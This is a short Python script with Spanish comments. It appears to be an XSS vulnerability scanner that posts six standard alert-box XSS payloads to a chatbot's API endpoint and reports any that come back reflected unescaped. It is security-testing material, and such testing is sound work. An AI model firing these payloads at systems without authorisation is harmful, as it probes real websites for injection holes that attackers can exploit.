import requests
import re

def test_xss_advanced(base_url, chat_endpoint):
    # Diferentes tipos de payloads XSS
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        'javascript:alert("XSS")'
    ]

    vulnerable = False

    for payload in payloads:
        # Enviar el payload al endpoint del chatbot
        response = requests.post(base_url + chat_endpoint, data={'message': payload})
        content = response.content.decode('utf-8')

        # Buscar el payload en la respuesta
        if re.search(re.escape(payload), content, re.IGNORECASE):
            print(f"Potentially vulnerable to XSS: {payload}")
            vulnerable = True

    if not vulnerable:
        print("No potential XSS vulnerabilities detected.")

# Ejemplo de uso
# base_url = "http://example.com"
# chat_endpoint = "/api/chat"
# test_xss_advanced(base_url, chat_endpoint)
